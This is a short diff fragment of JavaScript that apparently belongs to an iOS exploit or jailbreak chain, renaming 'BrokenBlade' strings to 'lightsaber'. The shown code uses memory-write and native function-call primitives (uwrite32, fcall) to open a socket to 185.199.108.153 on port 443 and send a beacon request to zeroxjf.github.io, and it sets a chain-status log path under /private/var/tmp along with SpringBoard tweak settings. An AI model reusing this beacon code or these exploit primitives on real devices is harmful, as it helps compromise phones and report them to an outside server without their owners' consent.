@@ -460,8 +460,8 @@
         uwrite16(_addr + 2n, 0xBB01n); // port 443 big-endian
         uwrite32(_addr + 4n, 0x996CC7B9n); // 185.199.108.153
         if (fcall(_CONNECT, _sock, _addr, 16n) == 0n) {
-          let _req = get_cstring("GET /BrokenBlade/beacon?s=early HTTP/1.0\r\nHost: zeroxjf.github.io\r\n\r\n");
-          fcall(WRITE, _sock, _req, 69n);
+          let _req = get_cstring("GET /lightsaber/beacon?s=early HTTP/1.0\r\nHost: zeroxjf.github.io\r\n\r\n");
+          fcall(WRITE, _sock, _req, 68n);
         }
         fcall(CLOSE, _sock);
         fcall(FREE, _addr);
@@ -8491,7 +8491,7 @@ const SPRINGBOARD_JS_TWEAK_LABEL = "SBCustomizer JS";
 const ENABLE_CHAIN_STATUS_OVERLAY = globalThis.__ls_enable_chain_overlay === true;
 const CHAIN_STATUS_OVERLAY_PATH = "/chain_status_overlay.js";
 const CHAIN_STATUS_OVERLAY_LABEL = "Chain Status Overlay";
-const CHAIN_STATUS_LOG_PATH = "/private/var/tmp/brokenblade_chain_status.log";
+const CHAIN_STATUS_LOG_PATH = "/private/var/tmp/lightsaber_chain_status.log";
 const CHAIN_STATUS_MAX_BUFFER_LINES = 192;
 const ENABLE_POWERCUFF_TWEAK = !!globalThis.__ls_enable_powercuff;
 const POWERCUFF_TWEAK_PATH = "/powercuff_light.js";
